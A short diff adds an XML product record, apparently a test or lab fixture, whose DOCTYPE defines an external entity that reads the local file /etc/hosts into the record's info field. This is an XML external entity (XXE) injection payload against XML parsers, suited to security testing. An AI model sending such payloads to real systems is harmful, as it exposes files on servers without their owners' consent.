@@ -1,0 +1,8 @@
+<?xml version='1.0' encoding="UTF-8"?>
+<!DOCTYPE root [ <!ENTITY xxe SYSTEM "///etc/hosts">]>
+<product>
+  <title>test_product</title>
+  <info>&xxe;</info>
+  <value>9999</value>
+  <img_path>dummy0.jpg</img_path>
+</product>
